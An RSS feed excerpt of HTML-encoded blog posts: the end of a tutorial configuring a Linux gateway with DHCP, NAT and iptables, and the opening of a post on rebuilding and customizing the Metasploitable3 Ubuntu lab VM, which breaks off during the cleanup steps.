class=&quot;language-text&quot;&gt;8.8.8.8&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;8.8.8.4&lt;/code&gt;, or use any other DNS server that you wish.&lt;/p&gt;
&lt;p&gt;The remaining options specified above are for IP address allocation. This configuration is for the IP range &lt;code class=&quot;language-text&quot;&gt;192.168.100.0\24&lt;/code&gt;, or from &lt;code class=&quot;language-text&quot;&gt;192.168.100.0&lt;/code&gt; to &lt;code class=&quot;language-text&quot;&gt;192.168.100.254&lt;/code&gt;. The &lt;code class=&quot;language-text&quot;&gt;range&lt;/code&gt; option specifies the range of addresses to provide for lease, in this case, it is limited to 80 addresses, from &lt;code class=&quot;language-text&quot;&gt;192.168.100.20&lt;/code&gt; to &lt;code class=&quot;language-text&quot;&gt;192.168.100.100&lt;/code&gt;. This can be modified to suit. Finally, the &lt;code class=&quot;language-text&quot;&gt;routers&lt;/code&gt; option, specifies the address of the &lt;em&gt;gateway&lt;/em&gt; machine, which has a static IP address of &lt;code class=&quot;language-text&quot;&gt;192.168.100.10&lt;/code&gt;. The &lt;code class=&quot;language-text&quot;&gt;routers&lt;/code&gt; option has the IP address of the &lt;em&gt;gateway&lt;/em&gt; because this is the machine that forwards traffic from the internal network to external networks.&lt;/p&gt;
&lt;p&gt;Save the file, then restart service:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo service isc-dhcp-server restart&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;configure-network-address-translation&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configure-network-address-translation&quot; aria-label=&quot;configure network address translation permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configure Network Address Translation&lt;/h2&gt;
&lt;p&gt;Enable IPv4 forwarding:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo vim /etc/sysctl.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Uncomment the following line:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;net.ipv4.ip_forward=1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Check forwarding worked using:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sysctl net.ipv4.ip_forward
OR
cat /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Add a NAT forwarding rule using &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo iptables -t nat -A POSTROUTING -o ens160 -j MASQUERADE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Save the &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; configuration:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install iptables-persistent
sudo su
sudo iptables-save &gt; /etc/iptables/rules.v4
exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ensure the rules load at boot:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /etc/rc.local &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Add the following line:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;/sbin/iptables-restore &lt; /etc/iptables/rules.v4&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;configuring-internal-hosts-linux&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-internal-hosts-linux&quot; aria-label=&quot;configuring internal hosts linux permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring Internal Hosts: Linux&lt;/h2&gt;
&lt;p&gt;With the gateway setup to provide DHCP and NAT services, a Linux host on the internal network can be configured to acquire an IP address from the gateway, and have all traffic routed through the gateway. The only configuration required on a Linux client is to edit the network configuration file and set the NIC of the client to DHCP.&lt;/p&gt;
&lt;p&gt;List the NICs that are available on the system:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ls /sys/class/net/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Open the network interfaces file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /etc/network/interfaces&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the following instructions, the NICs on the Linux client is named &lt;code class=&quot;language-text&quot;&gt;ens160&lt;/code&gt;. Configure the NIC to receive an IP address from the gateway:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;auto ens160
iface ens160 inet dhcp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure to restart the networking service to make sure the new configuration is applied:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo systemctl restart networking&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;configuring-internal-hosts-windows&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-internal-hosts-windows&quot; aria-label=&quot;configuring internal hosts windows permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring Internal Hosts: Windows&lt;/h2&gt;
&lt;p&gt;A full tutorial on configuring DHCP is beyond the scope of this post. Instead, I recommend checking out the &lt;a href=&quot;https://support.microsoft.com/en-nz/help/15089/windows-change-tcp-ip-settings&quot;&gt;excellent tutorial provided by Microsoft&lt;/a&gt; that covers how to configure a NIC for DHCP in Windows 10, 8.1, and 7. When configured you can open a Command Prompt and use the following command to check the configuration is working.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ipconfig&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;check-network-connectivity&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#check-network-connectivity&quot; aria-label=&quot;check network connectivity permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Check Network Connectivity&lt;/h2&gt;
&lt;p&gt;The overall network configuration is completed and hosts should be able to get IP addresses from the gateway DHCP server. Furthermore, the gateway will forward any traffic from the hosts to the outside world (Internet) and have DNS support. A summary of the IP addresses for each machine and NIC is displayed in the figure below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0a82bb509364dd70b53c5e110ef249ed/7e509/network_configuration.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.06329113924051%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABmElEQVQoz11S7W6bQBD0+79T+reJlKSuI7VN1dQpsWxQcAwHHPcF07k9sHGQhltGy+zs7a58GBGI5TOOE6bYh+GcwxDeDwlhwhTHnFV8hWHEZvOEr7d3OBwKaN2jaTpUlULTdiJknUdZfsBadym6LE5cBImHh0fcUvDHz19Yf9/w+xvW6w3u7x+xff2H48cJNzdf8Pz8G/t9jpeXv9huX5G97fCHcZ4XGOh+NbfsfKCLhN5YtF1Htwe6rNHSpSMf2FZZHtmBFqeGedZ6nk5OcTgLxrYvAAt4ijjej2flQQrG75lLCOLq/N/yDufWEwZx4GysbAXOeYHwbuYdBa8NXRwSy7jrWtR1RSiilrb6XjM+QQlXyfCiw+V/1y2L6CBJjT4i222RZW8oioKuBmjbYJ9n5HYcQg7dGwxjWqMrwarrU1WlKBhgbLrkuDq1amRlokNjvfBKtTKk5TDOLVuq78oTJ7qX0Rtj2K6GalrBO6cazygeEcUiJzF5rc3V/a8cW2x7K6sQ7yROLk00ITpw0zp95iJi/lLwP5CwVRBd+2JZAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;vRealize blueprint with network configuration&quot;
        title=&quot;vRealize blueprint with network configuration&quot;
        src=&quot;/static/0a82bb509364dd70b53c5e110ef249ed/f058b/network_configuration.png&quot;
        srcset=&quot;/static/0a82bb509364dd70b53c5e110ef249ed/c26ae/network_configuration.png 158w,
/static/0a82bb509364dd70b53c5e110ef249ed/6bdcf/network_configuration.png 315w,
/static/0a82bb509364dd70b53c5e110ef249ed/f058b/network_configuration.png 630w,
/static/0a82bb509364dd70b53c5e110ef249ed/7e509/network_configuration.png 745w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;You can check the DHCP leases on the &lt;em&gt;gateway&lt;/em&gt; machine using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cat /var/lib/dhcp/dhcpd.leases&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From &lt;em&gt;host1&lt;/em&gt;, or any other hosts on the internal network, it would be useful to check the connectivity by first pinging the DHCP allocated address:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ping 192.168.100.20&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then ping the IP address of the gateway internal-facing interface:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ping 192.168.100.10&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then finish it off with pinging any Internet DNS name:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ping google.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If all these tests pass, the configuration was successful!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Metasploitable3 - Customizing the Ubuntu Linux Version]]></title><description><![CDATA[This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building…]]></description><link>https://thomaslaurenson.com/blog/2018-07-04/metasploitable3-customizing-the-ubuntu-linux-version/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-04/metasploitable3-customizing-the-ubuntu-linux-version/</guid><pubDate>Wed, 04 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href=&quot;/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing the Ubuntu Linux Version&lt;/a&gt; (You are here!)&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href=&quot;/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1&quot;&gt;Pentesting the Ubuntu Linux Version - SQL Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href=&quot;/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2&quot;&gt;Pentesting the Ubuntu Linux Version - Attacking Services&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#cleaning-the-build-environment&quot;&gt;Cleaning the Build Environment&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#remove-the-virtual-machine-from-virtualbox&quot;&gt;Remove the Virtual Machine from VirtualBox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#removing-the-previous-vagrant-box&quot;&gt;Removing the Previous Vagrant Box&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#customizing-metasploitable3-ubuntu-linux-version&quot;&gt;Customizing Metasploitable3 Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#interesting-configuration-files&quot;&gt;Interesting Configuration Files&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#user-customization&quot;&gt;User Customization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#live-customization&quot;&gt;Live Customization&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;My previous post was a tutorial about &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Metasploitable3&lt;/a&gt;, where I specified the steps required to build the Metasploitable3 Ubuntu Linux version that is not officially finished or documented. In this tutorial, we go a step further and perform some customization of the Metasploitable3 virtual machine. This is performed during the actual build process of the virtual machine and requires editing various configuration files, then rebuilding the virtual machine. In this post, I will cover how to customize the vulnerabilities, users, and flags in the Metasploitable3 virtual machine.&lt;/p&gt;
&lt;h2 id=&quot;cleaning-the-build-environment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cleaning-the-build-environment&quot; aria-label=&quot;cleaning the build environment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cleaning the Build Environment&lt;/h2&gt;
&lt;p&gt;If you followed my previous tutorial, you will need to clean the Metasploitable3 build environment. If this is not performed, there will be a variety of errors encountered during the rebuilding process. For example, you cannot have two virtual machines in VirtualBox with the same name. Unfortunately, there is no quick clean-up script, so we will have to perform these steps manually. If you have not yet build a version of Metasploitable3, you do not need to perform these tasks.&lt;/p&gt;
&lt;h3 id=&quot;remove-the-virtual-machine-from-virtualbox&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#remove-the-virtual-machine-from-virtualbox&quot; aria-label=&quot;remove the virtual machine from virtualbox permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Remove the Virtual Machine from VirtualBox&lt;/h3&gt;
&lt;p&gt;Open VirtualBox and locate the previously created virtual machine, it will most likely be named using the default value of: &lt;code class=&quot;language-text&quot;&gt;Metasploitable3-ub1404&lt;/code&gt;. If you want to keep a backup of the original version, you can export it. To achieve this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Highlight the virtual machine by left-clicking the machine name&lt;/li&gt;
&lt;li&gt;Left-click &lt;code class=&quot;language-text&quot;&gt;Expert Mode&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Set the &lt;code class=&quot;language-text&quot;&gt;File&lt;/code&gt; path to save the virtual machine (the default location is the &lt;code class=&quot;language-text&quot;&gt;~/Documents&lt;/code&gt; folder)&lt;/li&gt;
&lt;li&gt;You can export to various formats, but I prefer the Open Virtualization Format 1.0&lt;/li&gt;
&lt;li&gt;This will save a &lt;code class=&quot;language-text&quot;&gt;.ova&lt;/code&gt; file for later import&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once you are happy that you have exported the original virtual machine or just want to remove it, you can delete it using the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Right-click the virtual machine (named: &lt;code class=&quot;language-text&quot;&gt;Metasploitable3-ub1404&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;From the menu, select &lt;code class=&quot;language-text&quot;&gt;Remove&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Make sure to &lt;code class=&quot;language-text&quot;&gt;Delete all files&lt;/code&gt; so that we can create another virtual machine with the same name&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;removing-the-previous-vagrant-box&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#removing-the-previous-vagrant-box&quot; aria-label=&quot;removing the previous vagrant box permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Removing the Previous Vagrant Box&lt;/h3&gt;
&lt;p&gt;Like the previous step, you can just delete the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file, or back it up. To save it, I recommend moving the file to the same location as the exported virtual machine. Achieved using the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Change to the Metasploitable3 repository folder (if in the home directory: &lt;code class=&quot;language-text&quot;&gt;cd ~/metasploitable3&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Move the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file: &lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;mv packer/build/ubuntu_1404_virtualbox_0.1.12.box ~/Documents/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you simply want to delete the previous &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Change to the Metasploitable3 repository folder (if in the home directory: &lt;code class=&quot;language-text&quot;&gt;cd ~/metasploitable3&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Delete the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file: &lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;rm packer/build/ubuntu_1404_virtualbox_0.1.12.box&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;customizing-metasploitable3-ubuntu-linux-version&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#customizing-metasploitable3-ubuntu-linux-version&quot; aria-label=&quot;customizing metasploitable3 ubuntu linux version permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 